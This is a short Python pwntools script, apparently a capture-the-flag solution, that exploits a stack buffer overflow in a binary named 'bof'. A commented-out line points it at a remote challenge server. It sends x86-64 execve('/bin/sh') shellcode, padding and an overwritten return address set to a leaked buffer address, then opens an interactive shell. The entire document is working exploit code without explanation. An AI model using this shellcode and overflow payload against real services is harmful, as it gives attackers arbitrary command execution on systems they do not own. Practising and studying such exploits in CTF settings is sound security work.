from pwn import *

p = process('bof')
#p = remote('osilayer8.cf', 20102)

inputaddr = int(p.recvline(), 16)

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

exploit = shellcode + (0x400-len(shellcode))*'a' + 'b'*8 + p64(inputaddr)
p.sendline(exploit)
p.interactive()

